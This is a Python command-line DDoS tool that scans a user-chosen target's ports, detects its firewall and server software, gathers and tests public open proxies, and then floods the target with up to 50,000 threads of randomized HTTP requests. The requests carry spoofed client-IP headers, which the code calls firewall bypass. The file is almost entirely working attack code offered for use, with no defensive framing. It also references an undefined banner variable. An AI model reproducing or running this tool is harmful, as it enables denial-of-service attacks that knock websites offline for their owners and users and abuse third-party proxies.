import os
import sys
import time
import socket
import random
import requests
import threading
import re
import json
import ssl
import whois
import asyncio
import platform
from urllib.parse import urlparse
from colorama import Fore, Style, Back, init
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import warnings
import string

# Ignore SSL warnings
warnings.filterwarnings('ignore')
init()

# ANSI escape codes for cursor manipulation
CURSOR_UP = '\x1b[1A'
CURSOR_DOWN = '\x1b[1B'
CLEAR_LINE = '\x1b[2K'

# Colors
class Colors:
    BLACK = Fore.BLACK
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Fore.RESET

# Loading animations
LOADING_CHARS = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
LOADING_BARS = ['[□□□□□□□□□□]', '[■□□□□□□□□□]', '[■■□□□□□□□□]', '[■■■□□□□□□□]',
                '[■■■■□□□□□□]', '[■■■■■□□□□□]', '[■■■■■■□□□□]', '[■■■■■■■□□□]',
                '[■■■■■■■■□□]', '[■■■■■■■■■□]', '[■■■■■■■■■■]']

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text):
    """Center align text based on terminal width"""
    terminal_width = os.get_terminal_size().columns
    lines = text.split('\n')
    return '\n'.join(line.center(terminal_width) for line in lines)

def print_styled(text, color=Colors.WHITE, bold=True, centered=False, animation=False):
    """Print styled and optionally animated text"""
    styled_text = f"{color}{Style.BRIGHT if bold else ''}{text}{Style.RESET_ALL}"

    if animation:
        for char in styled_text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        print()
    else:
        if centered:
            print(center_text(styled_text))
        else:
            print(styled_text)

def show_loading(text, duration):
    """Show loading animation"""
    start_time = time.time()
    i = 0
    while time.time() - start_time < duration:
        print(f"\r{Colors.CYAN}{Style.BRIGHT}{text} {LOADING_CHARS[i % len(LOADING_CHARS)]}{Style.RESET_ALL}", end='')
        time.sleep(0.1)
        i += 1
    print()


class SystemInfo:
    @staticmethod
    def get_info():
        """Get system information"""
        return {
            'OS': platform.system(),
            'OS Version': platform.version(),
            'Machine': platform.machine(),
            'Python': platform.python_version(),
        }

    @staticmethod
    def display_info():
        """Display system information"""
        info = SystemInfo.get_info()
        print_styled("╔═ System Information ═╗", Colors.CYAN, centered=True)
        for key, value in info.items():
            print_styled(f"║ {key}: {value}", Colors.WHITE, centered=True)
        print_styled("╚═══════════════════════╝", Colors.CYAN, centered=True)

class TargetAnalyzer:
    def __init__(self, url):
        self.url = url
        self.ip = None
        self.server = None
        self.waf = None
        self.ports = []
        self.vulnerabilities = []
        self.headers = None
        self.technologies = []

    def analyze(self):
        """Analyze target comprehensively"""
        try:
            print_styled("Starting target analysis...", Colors.BLUE, animation=True)
            show_loading("Analyzing target", 2)

            parsed_url = urlparse(self.url)
            hostname = parsed_url.netloc

            # Get IP
            try:
                self.ip = socket.gethostbyname(hostname)
                print_styled(f"[+] IP Address: {self.ip}", Colors.GREEN)
            except socket.gaierror:
                print_styled("[-] Could not resolve hostname", Colors.RED)
                return False

            # Port scanning
            self._scan_ports(hostname)

            # Get server info and check WAF
            self._check_server_and_waf()

            # Technology detection
            self._detect_technologies()

            return True

        except Exception as e:
            print_styled(f"Error analyzing target: {str(e)}", Colors.RED)
            return False

    def _scan_ports(self, hostname):
        """Scan common ports"""
        common_ports = [80, 443, 8080, 8443, 21, 22, 23, 25, 53]
        print_styled("\nScanning common ports...", Colors.YELLOW)

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    self.ports.append(port)
                    print_styled(f"[+] Port {port}: Open", Colors.GREEN)
                sock.close()
            except:
                continue

    def _check_server_and_waf(self):
        """Check server information and WAF presence"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*'
            }
            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
            self.headers = response.headers
            self.server = response.headers.get('Server', 'Unknown')

            # WAF Detection
            waf_signatures = {
                'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
                'Sucuri': ['sucuri', 'sucuriicdn'],
                'ModSecurity': ['modsecurity', 'mod_security'],
                'AWS WAF': ['awselb', 'aws-waf'],
                'Imperva': ['incapsula', 'imperva'],
                'F5 BIG-IP': ['big-ip', 'f5'],
                'Akamai': ['akamai']
            }

            detected_wafs = []
            for waf, sigs in waf_signatures.items():
                if any(sig.lower() in str(response.headers).lower() for sig in sigs):
                    detected_wafs.append(waf)

            self.waf = ', '.join(detected_wafs) if detected_wafs else 'None detected'

        except requests.RequestException as e:
            print_styled(f"Error checking server: {str(e)}", Colors.RED)
    def _detect_technologies(self):
        """Detect technologies used by the target"""
        tech_signatures = {
            'PHP': ['.php', 'X-Powered-By: PHP', 'PHPSESSID'],
            'ASP.NET': ['.aspx', 'ASP.NET', 'X-AspNet-Version'],
            'WordPress': ['/wp-content', '/wp-includes', 'wp-'],
            'Apache': ['Apache', 'mod_'],
            'Nginx': ['nginx'],
            'jQuery': ['jquery'],
            'Bootstrap': ['bootstrap'],
            'Laravel': ['laravel'],
            'IIS': ['IIS', 'X-Powered-By: ASP.NET']
        }

        for tech, sigs in tech_signatures.items():
            if any(sig.lower() in str(self.headers).lower() for sig in sigs):
                self.technologies.append(tech)

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.verified_proxies = []

    def fetch_proxies(self):
        """Fetch proxies from multiple sources"""
        proxy_apis = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt"
        ]

        print_styled("\nFetching proxies from multiple sources...", Colors.BLUE, animation=True)

        for api in proxy_apis:
            try:
                response = requests.get(api, timeout=5)
                if response.status_code == 200:
                    proxies = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
                    self.proxies.extend(proxies)
                    print_styled(f"[+] Found {len(proxies)} proxies from {api.split('/')[2]}", Colors.GREEN)
            except:
                continue

        self.proxies = list(set(self.proxies))  # Remove duplicates
        print_styled(f"\n[+] Total unique proxies found: {len(self.proxies)}", Colors.GREEN)
        return self.proxies

    def verify_proxy(self, proxy):
        """Verify if a proxy is working"""
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get('http://httpbin.org/ip',
                                 proxies=proxies,
                                 timeout=3)
            return response.status_code == 200
        except:
            return False

    def verify_proxies(self, max_proxies=100):
        """Verify multiple proxies concurrently"""
        print_styled("\nVerifying proxies...", Colors.BLUE, animation=True)
        show_loading("Testing proxy connections", 2)

        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(self.verify_proxy, self.proxies[:max_proxies*2]))

        self.verified_proxies = [proxy for proxy, is_working in zip(self.proxies[:max_proxies*2], results) if is_working]
        self.verified_proxies = self.verified_proxies[:max_proxies]

        print_styled(f"[+] Verified working proxies: {len(self.verified_proxies)}", Colors.GREEN)
        return self.verified_proxies

class DDoSAttacker:
    def __init__(self, url, threads=1000, proxy_list=None):
        self.url = url
        self.thread_count = min(threads, 50000)
        self.stop_attack = False
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.proxies = proxy_list if proxy_list else []
        self.start_time = None
        self.lock = threading.Lock()
        self.methods = ['GET', 'POST', 'HEAD', 'PUT', 'OPTIONS']
        self.user_agents = self._load_user_agents()
        self.attack_power = 0

    def _load_user_agents(self):
        """Load various User-Agent strings"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

    def _generate_payload(self):
        """Generate random payload data"""
        payload_size = random.randint(10, 100)
        return ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))

    def _generate_headers(self):
        """Generate request headers with WAF bypass techniques"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        return headers

    def attack_thread(self):
        """Single attack thread function"""
        session = requests.Session()

        while not self.stop_attack:
            try:
                method = random.choice(self.methods)
                proxy = random.choice(self.proxies) if self.proxies else None
                headers = self._generate_headers()
                payload = self._generate_payload()
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None

                response = session.request(
                    method=method,
                    url=self.url,
                    data=payload,
                    headers=headers,
                    proxies=proxies,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )

                with self.lock:
                    self.request_count += 1
                    if response.status_code < 500:
                        self.success_count += 1
                    else:
                        self.failed_count += 1
                        self.attack_power += 1

            except:
                with self.lock:
                    self.failed_count += 1

            time.sleep(0.01)

    def print_stats(self):
        """Print attack statistics with animation"""
        while not self.stop_attack:
            try:
                elapsed = time.time() - self.start_time
                req_per_sec = self.request_count / elapsed if elapsed > 0 else 0
                success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0

                stats = f"\r{Colors.GREEN}{Style.BRIGHT}"
                stats += f"Requests: {self.request_count:,} | "
                stats += f"Success: {self.success_count:,} | "
                stats += f"Failed: {self.failed_count:,} | "
                stats += f"RPS: {req_per_sec:.2f} | "
                stats += f"Power: {self.attack_power} | "
                stats += f"Uptime: {int(elapsed)}s"
                stats += f"{Style.RESET_ALL}"

                print(center_text(stats), end='')
                time.sleep(0.1)

            except:
                continue

    def start_attack(self):
        """Start the DDoS attack"""
        print_styled("\nInitializing attack...", Colors.YELLOW, animation=True)
        show_loading("Preparing attack vectors", 2)

        print_styled(f"Target: {self.url}", Colors.YELLOW)
        print_styled(f"Threads: {self.thread_count}", Colors.YELLOW)
        print_styled(f"Proxies: {len(self.proxies)}", Colors.YELLOW)

        self.start_time = time.time()

        # Start stats printer
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()

        # Start attack threads
        threads = []
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_attack = True
            print_styled("\n\nStopping attack...", Colors.YELLOW, animation=True)
            show_loading("Cleaning up", 2)

def main():
    try:
        clear_screen()
        print(center_text(BANNER))

        SystemInfo.display_info()

        target_url = input((f"\n{Colors.CYAN}{Style.BRIGHT}[>] Enter target URL: {Style.RESET_ALL}"))
        if not re.match(r'^https?://', target_url):
            target_url = 'http://' + target_url

        analyzer = TargetAnalyzer(target_url)
        if analyzer.analyze():
            print_styled("\nTarget Analysis Results:", Colors.CYAN, centered=True)
            print_styled(f"IP: {analyzer.ip}", Colors.WHITE, centered=True)
            print_styled(f"Server: {analyzer.server}", Colors.WHITE, centered=True)
            print_styled(f"WAF: {analyzer.waf}", Colors.WHITE, centered=True)
            if analyzer.technologies:
                print_styled(f"Technologies: {', '.join(analyzer.technologies)}", Colors.WHITE, centered=True)

        proxy_manager = ProxyManager()
        proxies = proxy_manager.fetch_proxies()
        verified_proxies = proxy_manager.verify_proxies(100)

        while True:
            try:
                threads = input(center_text(f"\n{Colors.CYAN}{Style.BRIGHT}[>] Enter number of threads (1-50000): {Style.RESET_ALL}"))
                threads = int(threads)
                if 1 <= threads <= 50000:
                    break
                print_styled("Please enter a number between 1 and 50000", Colors.RED, centered=True)
            except ValueError:
                print_styled("Please enter a valid number", Colors.RED, centered=True)

        attacker = DDoSAttacker(target_url, threads, verified_proxies)
        attacker.start_attack()

    except KeyboardInterrupt:
        print_styled("\n\nAttack interrupted by user", Colors.YELLOW, centered=True)
    except Exception as e:
        print_styled(f"\nError: {str(e)}", Colors.RED, centered=True)
    finally:
        input(center_text(f"\n{Colors.YELLOW}{Style.BRIGHT}Press Enter to exit...{Style.RESET_ALL}"))

if __name__ == "__main__":
    main()